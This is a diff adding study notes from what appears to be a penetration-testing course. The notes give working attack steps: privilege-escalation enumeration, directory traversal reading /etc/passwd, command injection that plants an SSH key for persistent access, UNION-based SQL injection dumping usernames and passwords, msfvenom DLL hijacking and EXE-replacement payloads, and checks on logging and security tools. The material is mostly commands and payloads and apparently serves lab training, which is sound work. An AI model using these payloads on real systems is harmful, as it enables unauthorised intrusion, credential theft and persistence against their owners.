@@ -114,21 +114,194 @@ run
 2)run winbuff.py script 
 ```
 
- 
+# Module Review Notes 
+## Recon/PostEx
+```
+nmap --scan=http-enum
+for i in {1..254}; do (ping -c 1 192.168.0.$i | grep "bytes from" &) ; done 2>/dev/null
+
+!! Check source code (CTRL + U) on website
+
+!! When on Box
+cat /etc/hosts
+cat /etc/passwd
+ip a
+ip neigh
+arp -a
+
+sudo -l
+!! Check GTFObins
+
+find / -type f -perm /4000 -ls 2>/dev/null   #FIND SUID ONLY FILES
+find / -type f -perm /2000 -ls 2>/dev/null   #FIND SGID ONLY FILES
+find / -type f -perm /6000 -ls 2>/dev/null   #FIND SUID/SGID FILES
+
+find / -type f -perm /2 -o -type d -perm /2 2>/dev/null
+#Search for any file or directory that is writable by the context "other"
+find / -type f -writable -o -type d -writable 2>/dev/null
+#Search for any file or directory that is writable by the current user
+
+#Cron daemon runs as root
+https://crontab.guru/
+
+/var/spool/cron/crontabs  #User level jobs
+/etc/crontab              #System level jobs
+/etc/cron.*               #Hourly,Daily,Weekly
+
+crontab -l                #lists for current user
+contab -u <user> -l       #lists for a specified user
+
+find /var/spool/cron/crontabs /etc/cron* -writable -ls
+#Finds any cron file or directory that can be written to.
+
+find /etc/cron* -type f -exec grep -Eo '/.*' {} \;
+#Find potential path and filename by looking for any entry that starts with a slash
 
 
+```
+## WebEx
+```
+SQL, MALICIOUS FILE UPLOAD, DIRECTORY TRAVERSAL, COMMAND INJECTION
+
+DIRECTORY TRAVERSAL - "File to search for"
+../../../ 
+view_image.php?file=../../../../../etc/passwd 
+```
+
+## COMMAND INJECTION - Server Runs commands for you
+```
+; whoami
+; cat /etc/passwd 
+
+UPLOAD PUBLICKEY
+ssh keys stored in /etc/ssh
+ssh-keygen -t rsa -b 4096
+cat .ssh/id_rsa
+cat .ssh/id_rsa.pub
+
+; ls -lisa /var/www/
+; mkdir /var/www/.ssh
+; ls -lisa /var/www/.ssh
+; echo "your_public_key_here" >> /var/www/.ssh/authorized_keys
+
+ssh -i .ssh/id_rsa www-data@x.x.x.x
+```
+
+## SQL GET METHOD IN URL
+```
+1) Find Vulnerable Field
+Go to each field
+?Selection=1 OR 1=1
+?Selection=2 OR 1=1 <-- Vulnerable
+
+2) Identify Columns
+?Selection=2 UNION SELECT 1,2,3
+
+3) Craft Golden statement - DUMPS ALL INFO 
+?selection=1 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+
+4) Craft Query
+?Selection=2 UNION SELECT name,pass,3 FROM session.user
+?Selection=2 UNION SELECT name,pass,@@version FROM session.user
+```
+## SQL POST METHOD
+```
+1) Identify Vulnerable Field
+--> Audi' OR 1='1
+
+2) Identify Columns
+Audi' UNION SELECT 1,2,3,4,5 #
+
+3) Craft Golden Statement - DUMPS ALL Info about Database
+Audi' UNION SELECT table_schema,2,table_name,column_name, FROM information_schema.columns #
+ANNOTATE DATA DUMPED
+
+Audi' UNION SELECT <column>,<column>,<column>,<column> FROM database.table
+
+4) Craft Query
+Audi' UNION SELECT studentID,2,username,passwd,5 FROM session.userinfo  #
+Audi' UNION SELECT 1,2,name,pass,5 FROM session.user #
+Audi' UNION SELECT carid,2,type,4,5 FROM session.car
+```
+
+## Reverse Engineering 
+```
+Ghidra
+Strings
+!! Find Success statement and work backwards
+
+(Needs to be an even number)
+x = param1
+if( x % 2 = 0){
+  printf("Success")
+}
+
+( x must equal 228) 
+x = param1
+if( x / 4 = 57){
+  printf("Success")
+}
+
+(Bit Shifting to the Right answwer is 1, work backwards)
+x = param1
+if( x << 4 = 16){
+  printf("Success")
+}
+```
+
+## ExploitDev 
+## See notes 
+
+## PostEx Cont.
+```
+Check for remote logging
+    Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
+
+    Older version only uses /etc/rsyslog.conf
+
+    Find out
+    grep "IncludeConfig" /etc/rsyslog.conf
+
+Check for security products
+  !! Clam
+  !! Rkhunter
+
+```
+
+## WindowsEX
+```
+# DLL hijacking
+Run procmon --> https://live.sysinternals.com/
+-- filters ---
+process name contains filename.exe
+path contains .dll
+result is NAME NOT FOUND
+-------
+run executable
+
+LINOPS> msfvenom -p windows/exec CMD='cmd.exe C/ "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
+Windows> SCP from LinOps
+
+## if process gets hung up and need to run again
+(get-process | ? {$.name -contains "file"}).kill()
 
 
+# EXE Replacement
+## Find a User created service that you can Rename
+## Must be able to write to directory/rename file
+## backupfile
+
+msfvenom -p windows/exec CMD='cmd.exe C/ "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe
+scp student@x.x.x.x:/home/student/putty.exe C:\users\student\desktop
 
 
+# AUDITPOL Logging
+Show all audit category settings
+auditpol /get /category:*
 
-
-
-
-
-
-
-
+Shows what is actually being logged
+auditpol /get /category:* | findstr /i "success failure"
+```
 
 
 
